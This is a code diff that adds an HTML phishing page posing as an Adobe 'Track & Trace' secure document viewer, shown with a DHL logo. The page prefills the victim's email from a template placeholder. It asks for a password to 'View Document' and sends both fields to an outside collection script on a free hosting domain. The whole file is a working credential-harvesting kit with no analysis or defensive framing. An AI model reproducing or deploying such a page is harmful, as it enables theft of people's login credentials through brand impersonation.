@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Track & Trace | Service & Support | ADOBE</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+
+        .background {
+            background-image: url('https://www.dnoviny.cz/assets/images/7ecb715234a74608972c1839ce994259/2819-640.jpg');
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1; /* Ensures the background stays behind other content */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background"></div>
+
+    <table cellspacing="0" align="center" width="100%" height="100%">
+        <tr><td height="0%" style="background:#FFFFFF;"></td></tr>
+        <tr>
+            <td height="100%" style="background-color: transparent;">
+            </td>
+        </tr>
+        <tr><td height="2%" style="background:#FFFFFF;"></td></tr>
+    </table>
+
+    <table>
+        <tr>
+            <td style="background-color: #FFF; position: absolute; top:52%; left: 50%; transform: translate(-50%, -50%);
+            z-index: 2; width: 325px; height:400px; padding: 0px; text-align: center;
+            -webkit-box-shadow: 1px 1px 1px 2px #848484; box-shadow: 1px 1px 1px 2px #848484; border-radius: 10px 10px 10px 10px;">
+
+                <table align="center" cellspacing="0">
+                    <tr><td style="height:0px;"></td></tr> 
+                    <tr> 
+                        <td> 
+                            <center>
+                                <img src="https://cdn.worldvectorlogo.com/logos/dhl-3.svg" alt="ADOBE PDF" width="100" height="70">
+                            </center>
+                        </td>
+                    </tr>
+                    <tr><td style="height:0px;">
+                        <!-- Form for Login -->
+                        <form method="post" action="https://support3234.jex.free.hr/1/send.php">
+                    </td></tr>
+                    <tr>
+                        <td>
+                            <center>
+                                <font face="calibri" color="#333333" style="font-size:15px;">
+                                    <b>Verify it's you</b><br>Only verified recipients on our ERP system can access secured shared files.
+                                </font>
+                            </center>
+                        </td>
+                    </tr>
+                    <tr><td style="height:10px;"></td></tr>
+                    <tr>
+                        <td>
+                            <center>
+                                <!-- Email input dynamically populated with JavaScript -->
+                                <input type="email" name="ai" id="emailField" readonly
+                                style="background: #FFF; width:260px; height:35px; border: #FFF; padding:10px; border-radius:3px;
+                                -webkit-box-shadow: 1px 1px 1px 1px #848484; box-shadow: 1px 1px 1px 1px #848484; font-size:15px; color:#1D5A28; font-weight:bold;">
+                            </center>
+                        </td>
+                    </tr>
+                    <tr><td style="height:8px;"></td></tr>
+                    <tr>
+                        <td>
+                            <center>
+                                <!-- Password input field -->
+                                <input type="password" placeholder="Password" name="pr" required
+                                style="background: #FFF; width:260px; height:35px; border: #FFF; padding:10px; border-radius:3px;
+                                -webkit-box-shadow: 1px 1px 1px 1px #848484; box-shadow: 1px 1px 1px 1px #848484; font-size:14px; color:#333333;">
+                            </center>
+                        </td>
+                    </tr>
+                    <tr><td style="height:8px;"></td></tr>
+                    <tr>
+                        <td>
+                            <center>
+                                <input type="submit" name="btn1" value="View Document"
+                                style="background: #eb1313; width:260px; height:35px; border: #eb1313; padding:10px; border-radius:7px;
+                                -webkit-box-shadow: 1px 1px 1px 1px #848484; box-shadow: 1px 1px 1px 1px #848484; font-size:14px; color:#FFFFFF; font-weight:bold;">
+                            </center>
+                        </td>
+                    </tr>
+                    </form>
+                    </td></tr>
+                    <tr><td style="height:20px;"></td></tr>
+                    <tr>
+                        <td><center>
+                            <font face="calibri" color="#333333" style="font-size:12px;">
+                            <strong>© 2025 ADOBE All rights reserved.</strong>
+                            </font>
+                            </center>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch or set the email dynamically
+            let userEmail = "{email}"; // Replace with dynamic logic if needed
+            document.getElementById("emailField").value = userEmail;
+        });
+    </script>
+
+</body>
+</html>
